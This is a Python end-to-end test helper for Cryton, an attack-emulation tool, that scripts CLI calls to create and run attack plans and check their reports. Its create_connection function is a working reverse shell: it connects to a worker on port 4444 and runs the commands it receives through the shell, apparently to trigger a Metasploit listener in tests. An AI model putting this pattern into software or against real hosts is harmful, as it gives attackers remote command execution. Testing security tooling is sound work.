from os import getenv, path
from pathlib import Path
import json
import random
import string
import time
import socket
import subprocess
from multiprocessing import Process
import yaml
from pprint import pp


class _Test:
    ROOT_DIRECTORY = Path(__file__).parent.parent.parent.absolute()
    EXAMPLES_DIRECTORY = path.join(ROOT_DIRECTORY, "examples")
    WORKER_ADDRESS = getenv("CRYTON_E2E_WORKER_ADDRESS", "127.0.0.1")
    WORKER_NAME = getenv("CRYTON_E2E_WORKER_NAME", "worker")

    def __init__(self, worker: str, template: str, inventory: str = None, execution_variables: str = None):
        print("ROOT_DIRECTORY", self.ROOT_DIRECTORY)
        print("EXAMPLES_DIRECTORY", self.EXAMPLES_DIRECTORY)
        print("WORKER_ADDRESS", self.WORKER_ADDRESS)
        print("WORKER_NAME", self.WORKER_NAME)
        self.worker = worker
        self.template = path.join(self.EXAMPLES_DIRECTORY, template)
        self.inventory = (
            path.join(self.EXAMPLES_DIRECTORY, inventory)
            if inventory
            else path.join(self.ROOT_DIRECTORY, "tests/e2e/inventory.yml")
        )
        self.execution_variables = execution_variables

        self.worker_id: int | None = None
        self.template_id: int | None = None
        self.plan_id: int | None = None
        self.run_id: int | None = None
        self.plan_execution_ids: list[int] = list()
        self.execution_variable_ids: list[int] = list()

    @staticmethod
    def _cli_call(command: list[str], parse_the_response: bool = True) -> dict | str:
        """
        Call CLI and parse the response.
        :param command: Command added to the CLI executable
        :return: Parsed response
        """
        cmd = ["cryton-cli", "--debug"] + command
        print(cmd)
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        if not parse_the_response:
            parsed_result = result.stdout.decode("utf-8")
        else:
            try:
                parsed_result = json.loads(result.stdout.decode("utf-8"))
            except json.JSONDecodeError as ex:
                pp(result)
                raise ex

        pp(parsed_result)
        return parsed_result

    def _create_worker(self, description: str = "E2E tests") -> None:
        """
        Create Worker.
        :param description: Worker's description
        :return: None
        """
        result = self._cli_call(["workers", "create", self.worker, "-d", description])
        if not "already exists" in str(result):
            self.worker_id = result["id"]
            return

        result = self._cli_call(["workers", "list", "-f", "name", self.worker])
        self.worker_id = result["results"][0]["id"]

    def _create_template(self) -> None:
        """
        Create template.
        :return: None
        """
        result = self._cli_call(["plan-templates", "create", self.template])
        self.template_id = result["id"]

    def _create_plan(self) -> None:
        """
        Create plan.
        :return: None
        """
        cmd = ["plans", "create", str(self.template_id)]
        if self.inventory:
            cmd += ["-i", self.inventory]
        result = self._cli_call(cmd)

        self.plan_id = result["id"]

    def _create_run(self) -> None:
        """
        Create run.
        :return: None
        """
        cmd = ["runs", "create", str(self.plan_id), str(self.worker_id)]
        result = self._cli_call(cmd)

        self.run_id = result["id"]
        self.plan_execution_ids = result["plan_execution_ids"]

    def _create_execution_variables(self) -> None:
        """
        Create execution variables.
        :return: None
        """
        for plan_execution_id in self.plan_execution_ids:
            cmd = ["execution-variables", "create", str(plan_execution_id), self.execution_variables]
            result = self._cli_call(cmd)
            self.execution_variable_ids += result["ids"]

    def prepare(self):
        self._create_worker()
        self._create_template()
        self._create_plan()
        self._create_run()
        if self.execution_variables:
            self._create_execution_variables()

    def execute_run_command(
        self,
        command: list[str],
        success_flag: str,
        final_state: str = None,
        timeout: int = 30,
        parse_the_response: bool = True,
    ):
        result = self._cli_call(command, parse_the_response)
        assert success_flag in str(result)

        if final_state:
            self.wait_for_run_state(final_state, timeout)

    def wait_for_run_state(self, state: str, timeout: int):
        """
        Waits for the correct state (of Run) desired by the user.
        :param state: Desired state
        :param timeout: When to stop
        :return: None
        """
        cmd = ["runs", "show", str(self.run_id)]
        calculated_timeout = time.time() + timeout
        while time.time() < calculated_timeout:
            current_state = self._cli_call(cmd)["state"]
            if current_state == state:
                return
            time.sleep(1)

        raise TimeoutError(f"State wasn't changed to {state} before the timeout ({timeout} seconds).")

    def validate_report(
        self,
        run_state: str = "FINISHED",
        plan_states: dict[int, str] = None,
        stage_states: dict[str, str] = None,
        step_states: dict[str, str] = None,
    ):
        """

        :param run_state: state
        :param plan_states: id: state
        :param stage_states: name: state
        :param step_states: name: state
        :return:
        """
        if plan_states is None:
            plan_states = {}
        if stage_states is None:
            stage_states = {}
        if step_states is None:
            step_states = {}

        report = self._cli_call(["runs", "report", str(self.run_id), "--localize"])
        run = report["detail"]
        assert run["state"] == run_state
        for plan_ex in run["plan_executions"]:
            assert plan_ex["state"] == plan_states.get(plan_ex["id"], "FINISHED")
            for stage_ex in plan_ex["stage_executions"]:
                assert stage_ex["state"] == stage_states.get(stage_ex["name"], "FINISHED")
                for step_ex in stage_ex["step_executions"]:
                    assert step_ex["state"] == step_states.get(step_ex["name"], "FINISHED")


def trigger_msf_listener(worker_address: str, worker_port: int, timeout: int = 30) -> Process:
    timeout_at = time.time() + timeout
    while True:
        p = Process(target=create_connection, args=(worker_address, worker_port))
        p.start()
        p.join(5)
        if p.is_alive():
            return p
        if time.time() > timeout_at:
            break
        time.sleep(0.3)

    raise RuntimeError(f"Unable to trigger the Metasploit listener in the given time.")


def create_connection(target: str, port: int = 4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        so.connect((target, port))
    except ConnectionError:
        return

    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(
            d.decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


def create_inventory(inventory: dict):
    file_name = f"/tmp/{''.join(random.choices(string.ascii_lowercase, k=10))}"
    with open(file_name, "w") as f:
        yaml.dump(inventory, f)

    return file_name
